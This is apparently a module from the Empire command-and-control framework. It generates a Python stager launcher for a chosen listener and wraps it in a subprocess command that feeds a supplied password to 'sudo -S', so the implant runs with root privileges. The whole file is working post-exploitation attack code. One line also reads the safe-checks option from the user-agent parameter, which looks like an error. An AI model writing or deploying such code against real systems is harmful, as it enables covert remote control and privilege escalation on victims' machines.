from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # extract all of our options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["UserAgent"]

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(
            listener_name,
            language="python",
            userAgent=user_agent,
            safeChecks=safe_checks,
        )

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")
        else:
            password = params["Password"]

            launcher = launcher.replace('"', '\\"')
            launcher = launcher.replace("echo", "")
            parts = launcher.split("|")
            launcher = "python3 -c %s" % (parts[0])
            script = 'import subprocess; subprocess.Popen("echo \\"{}\\" | sudo -S {}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)'.format(
                password, launcher
            )

            return script
